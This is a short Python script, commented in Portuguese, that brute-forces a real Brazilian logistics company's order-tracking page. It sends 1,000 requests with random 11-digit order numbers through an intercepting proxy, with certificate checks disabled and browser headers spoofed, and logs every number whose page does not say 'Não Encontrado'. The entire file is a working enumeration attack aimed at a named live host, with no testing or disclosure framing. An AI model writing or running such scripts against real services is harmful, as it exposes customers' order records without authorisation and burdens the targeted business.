from requests import get, post
import random
#limpar warning message no console importando lib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

verify = False

def gerar_numero():
    return str(random.randint(10_000_000_000, 99_999_999_999))

print(gerar_numero())

for i in range(1000):
    url = f"https://gruposbf.brudam.com.br:443/tracking/Painel.php?cPed={gerar_numero()}"
    headers = {
        "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "pt-BR,pt;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive"
    }
    
    req=get(url, headers=headers, proxies=proxies, verify=verify)
    
    # a resposta tras                    <span class="text-comment">Não Encontrado</span> quando não encontrado pedido
    if "<span class=\"text-comment\">Não Encontrado</span>" in req.text:
        print(f"Pedido {url} não encontrado.")
        continue
    else:
        print(f"Pedido {url} encontrado.")